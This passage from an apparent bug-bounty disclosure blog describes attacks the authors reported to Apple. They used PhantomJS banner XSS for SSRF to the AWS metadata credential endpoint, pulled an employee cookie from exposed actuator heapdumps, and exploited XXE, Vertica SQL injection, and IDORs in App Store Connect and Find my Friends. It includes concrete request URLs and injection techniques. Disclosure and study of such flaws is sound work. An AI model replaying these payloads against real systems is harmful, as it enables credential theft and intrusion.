&lt;img loading=&quot;lazy&quot; width=&quot;882&quot; height=&quot;244&quot; class=&quot;wp-image-1230&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3.png 882w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3-300x83.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3-768x212.png 768w&quot; sizes=&quot;(max-width: 882px) 100vw, 882px&quot;/&gt;&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Execute arbitrary commands on the nova.apple.com webserver&lt;/li&gt;
&lt;li&gt;Access Apple's internal network&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;At this point, we decided we had proven enough impact and stopped. The full flow from above is as follows:&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; class=&quot;alignnone size-full wp-image-1429&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1.png&quot; alt=&quot;&quot; width=&quot;801&quot; height=&quot;951&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1.png 801w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1-253x300.png 253w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1-768x912.png 768w&quot; sizes=&quot;(max-width: 801px) 100vw, 801px&quot;/&gt;&lt;/div&gt;
&lt;div id=&quot;vuln7&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;AWS Secret Keys via PhantomJS iTune Banners and Book Title XSS&lt;/h2&gt;
&lt;p&gt;We discovered the iTunes banner maker website a few weeks prior to finding this vulnerability. It was not until we added a book via iTunes Connect did we discover an interesting feature on the banner maker.&lt;/p&gt;
&lt;a href=&quot;https://banners.itunes.apple.com/us/catalog&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/fwxTlRWNiYiVyXacPRy5o3bi-CIgIlNLXbplayQx164-lAJzi1aDj-zufIWJjpP2PNnnuIp95jvN7iOtMiDlSZM5Ry7L2gx8ezjDJYvNC3Vhdm6FQGtz30mnR7xTGqxpMEfUCE67&quot; alt=&quot;&quot;/&gt;&lt;/a&gt;
&lt;p&gt;There are multiple banner image formats based on the height and width specified. We discovered that the &quot;300x250&quot; banner image included the book name.&lt;/p&gt;
&lt;p&gt;We also noticed that it was vulnerable to Cross-Site Scripting because the book name was underlined with our injected &quot;&amp;lt;u&amp;gt;&quot; element which we had set whilst registering the book on iTunes connect.&lt;/p&gt;
&lt;img src=&quot;https://lh6.googleusercontent.com/0Hq4k3hjZE8AKEqM3qUZXL7zRr3UuDYRB0II6v5p9CwFI8Qz0kQTESbS2St6bEvTC8_DdgTO8H1DN8FALDFAnmdmylMzKiFZ3V5d40vx3VqeSDerH9_F3behmmiu-E4fYDUzg_4N&quot; alt=&quot;&quot;/&gt;&lt;p&gt;Image URL:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes&amp;amp;t=catalog_black&amp;amp;c=us&amp;amp;l=en-US&amp;amp;id=1527342866&amp;amp;w=300&amp;amp;h=250&amp;amp;store=books&amp;amp;cache=false&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Earlier we had already discovered that there was path traversal and parameter injection in a few of the request parameters such as &quot;pr&quot;. For example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes/../../&amp;amp;t=catalog_black&amp;amp;c=us&amp;amp;l=en-US&amp;amp;id=1527342866&amp;amp;w=300&amp;amp;h=250&amp;amp;store=books&amp;amp;cache=false&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Results in a picture of the AWS S3 error page:&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; width=&quot;300&quot; height=&quot;88&quot; class=&quot;wp-image-1221&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/banner.png&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;From here we made the assumption that they were using a headerless browser client to take screenshots of HTML files inside of an S3 bucket. So the next step was to create a book with &amp;lt;script src=””&amp;gt; in the name to start playing around with the XSS in the image generation process.&lt;/p&gt;
&lt;p&gt;The first thing we noticed was in the request log when it hit our server:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;54.210.212.22 - - [21/Aug/2020:15:54:07 +0000] &quot;GET /imgapple.js?_=1598025246686 HTTP/1.1&quot; 404 3901 &quot;http://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&amp;amp;t=catalog_white&amp;amp;c=us&amp;amp;l=en-US&amp;amp;id=1528672619&amp;amp;w=300&amp;amp;h=250&amp;amp;store=books&amp;amp;cache=false&quot; &quot;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1&quot;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This is the S3 bucket / image it was hitting to generate the picture:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;http://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&amp;amp;t=catalog_white&amp;amp;c=us&amp;amp;l=en-US&amp;amp;id=1528672619&amp;amp;w=300&amp;amp;h=250&amp;amp;store=books&amp;amp;cache=false&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And this is the User-Agent:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;PhantomJS/2.1.1&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Luckily for us, Brett had actually exploited exactly this a few years prior:&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet&quot; data-width=&quot;550&quot; data-dnt=&quot;true&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read &lt;a href=&quot;https://t.co/PDwuM45QS7&quot;&gt;https://t.co/PDwuM45QS7&lt;/a&gt;&lt;/p&gt;
— Brett Buerhaus (@bbuerhaus) &lt;a href=&quot;https://twitter.com/bbuerhaus/status/880498767551541248?ref_src=twsrc%5Etfw&quot;&gt;June 29, 2017&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;The first thing was to write our JS XSS payload to perform Server-Side Request Forgery attacks. A good method to do this and render data is with the &amp;lt;iframe&amp;gt; element.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gist.github.com/ziot/ef5297cc1324b13a8fae706eeecc68a5&quot;&gt;https://gist.github.com/ziot/ef5297cc1324b13a8fae706eeecc68a5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Since we know this on AWS, we attempt to hit AWS metadata URI:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes&amp;amp;t=catalog_black&amp;amp;c=us&amp;amp;l=en-US&amp;amp;id=1528672619%26cachebust=12345%26url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance%26&amp;amp;w=800&amp;amp;h=800&amp;amp;store=books&amp;amp;cache=false&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This rendered a new banner image with the full AWS secret keys for an ec2 and iam role:&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;600&quot; height=&quot;272&quot; class=&quot;wp-image-1220&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/image-1.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/image-1.png 600w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/image-1-300x136.png 300w&quot; sizes=&quot;(max-width: 600px) 100vw, 600px&quot;/&gt;&lt;p&gt;Most of Apple’s interesting infrastructure appears to be in the /8 IP CIDR they own dubbed “Applenet,” but they do have quite a bit of hosts and services in AWS ec2/S3. We knew the SSRF would not be super interesting with the recon we performed as most of the interesting corp targets are in Applenet and not AWS.&lt;/p&gt;
&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Read contents from Apple's internal Amazon Web Services environment&lt;/li&gt;
&lt;li&gt;Access and use the AWS ec2 keys discloses within the internal metadata page&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;div id=&quot;vuln8&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Heap Dump on Apple eSign Allows Attacker to Compromise Various External Employee Management Tools&lt;/h2&gt;
&lt;p&gt;During our initial recon phase collecting sub-domains and discovering the Apple public-facing surface, we found a bunch of “esign” servers.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;https://esign-app-prod.corp.apple.com/&lt;/li&gt;
&lt;li&gt;https://esign-corpapp-prod.corp.apple.com/&lt;/li&gt;
&lt;li&gt;https://esign-internal.apple.com&lt;/li&gt;
&lt;li&gt;https://esign-service-prod.corp.apple.com&lt;/li&gt;
&lt;li&gt;https://esign-signature-prod.corp.apple.com&lt;/li&gt;
&lt;li&gt;https://esign-viewer-prod.corp.apple.com/&lt;/li&gt;
&lt;li&gt;https://esign.apple.com/&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Upon loading the subdomain, you’re immediately redirected to a /viewer folder. When you go through the Apple idmsa authentication flow, you are returned to an “you are not authorized” error.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-Cnr64PesJ0uxrzCJx1X-ApgCVwC_a6mkU5thdDW1GozME_cVQT4Je9BYeyzM6qWZGqtFPTNqikvLgOjmbFll01dfzx-YdTPoaYe1L4fAb4035P8yOgu7Lr_1KKnhdb1aM3Pdjq6&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;We do not have access to any links or interesting js files from this page, so we tried some basic wordlists to see if we could find endpoints for the application. From here we discovered that &lt;strong&gt;/viewer/actuator&lt;/strong&gt; responded with all of the actuator endpoints including mapping and heapdump.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/JN6I9UO7humpZa44Me1k0sFg3Q3Vqr_cX9y76920sKLd1Ip7U9NbD20slJkg8WZlZ3iAxJM6rvwptP13x-tTmIanJqrJggQfspPx-vy5spdq040iA2vujhv8EVQ0Z5E23e3xgXhg&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;We were unable to make changes by sending state-changing requests to actuator in an attempt for Remote Code Execution, so we had to find an alternative route for proving impact.&lt;/p&gt;
&lt;p&gt;The mappings exposed all the web routes to us, including additional folders at the root of the host that had additional actuator heapdumps in them. It was at this point that we realized the actuator endpoints were vulnerable in each app folder on all esign subdomains. From here we grabbed a heapdump from ensign-internal.&lt;/p&gt;
&lt;p&gt;We loaded the heapdump using Eclipse Memory Analyzer and exported all the strings out to csv to sift with grep.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/IDK7irnePAsVrtStPWgyWEFf8vmYj1sFyyC0-FtV8TW8mKCw9MKla5BEt_24OUJTmapgARpuhW_q23g6TTmK7uW8bHBrlpXRRtkKwjfr18gZekd9IOoZ8KoGXuw82oA74WgYjqDn&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;From there we learned that the application’s authentication cookie is “acack”. We searched for acack in the heapdump until we found a valid session cookie. &lt;strong&gt;At this point we were certain that it was an Apple employee token and not a customer, otherwise we would not have tested it.&lt;/strong&gt; Upon loading it, we were able to access the application.&lt;/p&gt;
&lt;p&gt;There’s not much we can show, but here’s a snippet showing the authenticated view of the page:&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/1dRv06Mb3lUE3jxw0XCyvAA-haDw4ZvYEH3c5EZPekycTJp8t2IV62xSMBHYibHoSepperP9x4AmzhvIobvHkcUexAO8SNTBCnneWg6i-ODX1QwcMAETR9uC4SidlDFBPqX7j4Ez&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;This gave us access to 50+ application endpoints, including some admin endpoints such as “setProxy” that would likely have been easily escalated to an internal SSRF or RCE. We also noticed that the acack cookie was authenticating us to other applications as well.&lt;/p&gt;
&lt;p&gt;Having proven sufficient impact we stopped here and reported it.&lt;/p&gt;
&lt;p&gt;Actuators exposing heapdumps public-facing are nothing new and it’s a relatively low-hanging finding that most wordlists will catch. It’s important to remember that just because you aren’t finding them commonly, they’re still out there and on big targets just waiting to be found by an attacker.&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;vuln9&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;XML External Entity processing to Blind SSRF on Java Management API&lt;/h2&gt;
&lt;p&gt;During testing, we discovered an API with multiple unauthenticated functions that all consumed &quot;application/xml&quot; after finding an exposed &quot;application.wadl&quot; on one of the many 17.0.0.0/8 hosts.&lt;/p&gt;
&lt;p&gt;An application.wadl file defines the endpoints used by this service. This was a test instance of a service that is normally locked down and inaccessible.&lt;/p&gt;
&lt;p&gt;We were able to use a blind XXE payload to demonstrate a blind SSRF.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; width=&quot;1021&quot; height=&quot;305&quot; class=&quot;wp-image-1159&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp.png 1021w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp-300x90.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/bssrfhttp-768x229.png 768w&quot; sizes=&quot;(max-width: 1021px) 100vw, 1021px&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Sadly, we were not able to fully exploit this to read files on this machine or get a response back from an SSRF due to the Java version used on this machine (fully patched, preventing a 2 stage blind XXE payload). Additionally we did not know the expected XML format structure (preventing a non-blind XXE exploit).&lt;/p&gt;
&lt;p&gt;This vulnerability was interesting as Apple is heavily XML dependent and it felt like we would’ve found more instances of XXE with how many requests we’d seen using it. It was surprising exploiting this one because to achieve blind XXE as it was very straightforward compared to all of the complicated ways we’d tried to identify it over time.&lt;/p&gt;
&lt;p&gt;If we were to ever successfully exploit this to achieve local file read or full response SSRF, it would likely be through finding the proper XML format for the API itself in order to reflect the file contents directly versus achieve blind exfiltration.&lt;/p&gt;
&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Obtain what are essentially keys to various internal and external employee applications&lt;/li&gt;
&lt;li&gt;Disclose various secrets (database credentials, OAuth secrets, private keys) from the various esign.apple.com applications&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;div id=&quot;vuln10&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;GBI Vertica SQL Injection and Exposed GSF API&lt;/h2&gt;
&lt;p&gt;Our initial recon efforts involved capturing screenshots of all Apple owned domains and IP addresses that responded with an HTTP banner. We found a couple servers that looked like this:&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/u8b96fWxMfQjOW1_HVBA5PT8xAoT58fdW20ytEbURi63xfeCYf2SGU6BHYPrBfvriKZqntI0cNtTZ78uNqbbjSc_zzB1c_YtgG17Vx1OWQC7gT0Nfu1pFz1n-QnQ8F3_-wwhZvIf&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;From here we started to mess around with some of the applications such as &quot;/depReports&quot;. We could authenticate to them and access some data via API requests to an API on the &quot;/gsf/&quot; route. All of the applications that we accessed on this host routed requests through that GSF service.&lt;/p&gt;
&lt;p&gt;The request looked like the following:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;POST /gsf/partShipment/businessareas/AppleCare/subjectareas/acservice/services/batch HTTP/1.1
Host: gbiportal-apps-external-msc.apple.com
{
    &quot;executionType&quot;: &quot;parallel&quot;,
    &quot;requests&quot;: [{
        &quot;queryName&quot;: &quot;redacted&quot;,
        &quot;filters&quot;: {
            &quot;redacted_id&quot;: [&quot;redacted&quot;],
            &quot;redacted&quot;: [&quot;&quot;]
        }
    }, {
        &quot;queryName&quot;: &quot;redacted&quot;,
        &quot;filters&quot;: {
            &quot;redacted_id&quot;: [&quot;redacted&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;service_notification_number&quot;],
            &quot;redacted&quot;: [&quot;desc&quot;]
        }
    }, {
        &quot;queryName&quot;: &quot;redacted&quot;,
        &quot;filters&quot;: {
            &quot;redacted_id&quot;: [&quot;redacted&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;&quot;],
            &quot;redacted&quot;: [&quot;service_notification_number&quot;],
            &quot;redacted&quot;: [&quot;desc&quot;],
            &quot;redacted&quot;: [&quot;100&quot;],
            &quot;redacted&quot;: [&quot;0&quot;]
        }
    }]
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;You can see almost immediately that there are some really strong indicators here that they are interacting with SQL. Keywords: query, limit, offset, column names, filter, etc. Making one tiny change to see what happens, we got the following:&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; class=&quot;alignnone size-full wp-image-1433&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;357&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1-300x105.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-6-1024x357-1-768x268.png 768w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/div&gt;
&lt;p&gt;(Heavily redacted, covering up the query error that includes column names, table name, database name, etc). The important bit is:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;exception is java.sql.SQLException: java.sql.SQLSyntaxErrorException: [Vertica][VJDBC](4856) ERROR: Syntax error at or near \&quot;adesc\&quot;&quot;}]}]}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We eventually got a union injection working. Some important parts were the extra &quot;*/*/&quot; closing comments in limit due to stacking queries. We also had to use /**/ between FROM and table as vSQL has some protections built into it against SQL injection.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; class=&quot;alignnone size-full wp-image-1434&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;671&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1-300x197.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-7-1024x671-1-768x503.png 768w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/div&gt;
&lt;p&gt;There is no vSQLMap, so a lot of manual effort went into getting a working injection:&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/r_r33d0Z_1BIbghOLKH5hoTGN8KBhbz2IS9DflPH4Zgq2OX30j5lPfv_RHKgkvKKjT6pxb1oabkVwG9yqbyLhnX5y6UTz7ZPZ2dDnEqa5GWe0H5PrU6UnZF5kA79dLFZSiopfMRE&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Once we got it working, we decided to script it out to make it easier. We uploaded a gist of it on Github here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gist.github.com/ziot/3c079fb253f4e467212f2ee4ce6c33cb&quot;&gt;https://gist.github.com/ziot/3c079fb253f4e467212f2ee4ce6c33cb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If anyone is interested in Vertica SQL injection, I highly recommend checking out their SQL docs. There are some interesting functions that could be leveraged to take the injection further, e.g.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vertica.com/docs/9.2.x/HTML/Content/Authoring/SQLReferenceManual/Functions/VerticaFunctions/s3export.htm&quot;&gt;https://www.vertica.com/docs/9.2.x/HTML/Content/Authoring/SQLReferenceManual/Functions/VerticaFunctions/s3export.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If configured with AWS keys, you can use the SQL injection to pull AWS secret keys off of the server. In our case, this wasn’t configured for AWS so we were not able to do that.&lt;/p&gt;
&lt;p&gt;We had enough information to report the SQL injection at this point. We decided to explore the &quot;/gsf/&quot; API a bit more as we figured they might ACL off this host and it would no longer be public-facing.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/b7_JQeN0kKZJVolyDy4aGnOx5zPBrSlx14OsH5VADjRtLnguZzlS78HEHY9pzwEcjhDgjAOH7yamOSe1ImOlheROZq8MWNUTF1GRMdhDLiccBYUcpJkHN3KXS2xW0mj7GZKE6aCI&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;It was quickly apparent that the GSF API had access to the “GSF” module that exposed a lot of information about GSF applets. This included some API endpoints for pulling cluster data, application data, and possibly even deploying new clusters and applications.&lt;/p&gt;
&lt;p&gt;We speculate at this point we would have been able to deploy internal APIs to the public-facing &quot;/gsf/ &quot;in this cluster giving us access to sensitive data. However, we didn’t prove it out due to the risk. We reported it and stopped here.&lt;/p&gt;
&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Likely compromise the various internal applications via the publicly exposed GSF portal&lt;/li&gt;
&lt;li&gt;Execute arbitrary Vertica SQL queries and extract database information&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;div id=&quot;vuln11&quot; class=&quot;section&quot;&gt;
&lt;h2&gt;Various IDOR Vulnerabilities&lt;/h2&gt;
&lt;p&gt;Throughout testing on Apple we discovered a variety of IDORs affecting different parts of Apple. The first one was found within the app store connect application that was used to manage apps on the app store.&lt;/p&gt;
&lt;h4&gt;App Store Connect&lt;/h4&gt;
&lt;p&gt;After signing up for the developer service, the first thing we did was explore the App Store Connect application which let developers manage their apps that they had or planned to release to the app store.&lt;/p&gt;
&lt;p&gt;Hidden behind a few hyperlinks from the settings page was a setting to enable the Game Center for the application. This would allow you to create leader-boards and manage locales for your application. If you enabled this, you were redirected to a more older looking page which used a new set of identifiers to manage the new game center/locale settings you can add to your app.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; width=&quot;911&quot; height=&quot;548&quot; class=&quot;wp-image-1198&quot; src=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center.png&quot; alt=&quot;&quot; srcset=&quot;https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center.png 911w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center-300x180.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/game_center-768x462.png 768w&quot; sizes=&quot;(max-width: 911px) 100vw, 911px&quot;/&gt;&lt;/div&gt;
&lt;p&gt;There was an &quot;itemId&quot; parameter being sent in the URL which was a numeric value that defined which app settings you were modifying. By modifying the number, we could access and modify the leader-boards of any app. This would allow an attacker to deface or remove entirely the game center settings from the app.&lt;/p&gt;
&lt;p&gt;Additionally, a similar page here let us modify the language/locale settings for the app store which would’ve allowed an attacker to deface or remove entirely the language settings for any app.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/0zUndumV-PjVrOg5LniZZUEgq9QQnpqSiAmJbQ-i4yz8BaBqQMXqn3q75jJkg9Q1C1S-_PBihlgAKdnO4aBAOy8bv7QmW0Y3CTXG9T1rgGdotI9DcotorqeYQnGEIpS4jtN6HhJn&quot; alt=&quot;&quot;/&gt;&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;View and modify metadata of any apps on the app store&lt;/li&gt;
&lt;li&gt;Change data within any application's Game Center information page&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;h4&gt;iCloud Find my Friends IDOR&lt;/h4&gt;
&lt;p&gt;The iCloud service has a functionality where parents can create and manage child accounts through their primarily Apple account. This behavior was super interesting because of the parent/child relationship and permission model within the application.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; src=&quot;https://lh6.googleusercontent.com/yVaQL6pBQ98f8ahp2hW1XBQ12i1uvIQ5_JL-lLW0xmLHEI4slgToXIECn43AUZr5R3XxqYlr3r0SCIRZ6b-klpRj8nwXTPz4tfduIq9aix0K19ipR8ss3w3ReWHGUJwbQT4qAC0b&quot; alt=&quot;&quot; width=&quot;263&quot; height=&quot;569&quot;/&gt;&lt;/div&gt;
&lt;p&gt;If a parent created or added a child account they would have immediate access to perform certain actions against the sub-account like checking the location of the child’s device, limiting device usage, and viewing stored photos and videos. The user management was primarily done through the iOS app which you weren’t able to intercept without finding an SSL pinning bypass, so we decided to look at the other applications like Find my Friends and Photos which integrated sub-functionality for the parent/child relationship.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; src=&quot;https://lh4.googleusercontent.com/55Qvr4DZlucVfN_VoiolqOijqLt1hWriogvux7QrtHxh6gKLy4USvvphEjGZXuyYkaN7FvfDGMEUQbtN5x1LKLEBNd-rEGgoffH0Rfhojd9UBilskDlmpHdsOr7RXcO75K_ER9ke&quot; alt=&quot;&quot; width=&quot;292&quot; height=&quot;255&quot;/&gt;&lt;/div&gt;
&lt;p&gt;There were functionalities under “Find my Friends” where you could select your family members then click “Share My Location” and, since it was a trusted relationship between family members, immediately share your location with the family member without them having to accept the request and without the ability to remove your shared presence from their app. Luckily enough for us, this HTTP request to perform the action was interceptable and we could see what the arguments looked like.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/Ogp93NMi_NhqQL9MLB7aqGDI7mi9FyQ1muIUobJuj5WW9hgyyRfunQD8rSQgZas2dSXdKqEHf7z3SHEaSRh1uuwRvSwB5faY2ttmr1O5OPFcj4s_d3sS4Tj7SgRjkeLmK7ltkyeB&quot; alt=&quot;&quot;/&gt;&lt;/div&gt;
&lt;p&gt;The “dsIds” JSON parameter was used as an array of user IDs to share your location. Within the HTTP response, the family members email was returned. I went ahead and modified this value to another user’s ID and to my surprise received their email.&lt;/p&gt;
&lt;p&gt;This IDOR would allow us to enumerate the core identifier for Apple accounts to retrieve customer emails and irrevocably share our location with the victim user IDs in which we could send notifications and request access to their location. Since the parameter was sent via a JSON array, you could request hundreds of identifiers at a time and easily enumerate a massive amount of user IDs belonging to Apple customers.&lt;/p&gt;
&lt;div class=&quot;wp-block-image&quot;&gt;&lt;img loading=&quot;lazy&quot; src=&quot;https://lh5.googleusercontent.com/0ZSHVo8OqPEHLHI2FR4rUvwk57QiOzje5QCB0k1ZtZD17TgVPYOer9ZBANG_Id6KtMHtU4nzqdfIYwmHqkcU2hvxrD4UJRyuGYHRysGZ5kMDvOHJ97popxyoFNg9W7x1Z0JY7EbE&quot; alt=&quot;&quot; width=&quot;263&quot; height=&quot;569&quot;/&gt;&lt;p&gt;Overall, an attacker could've abused this to...&lt;/p&gt;
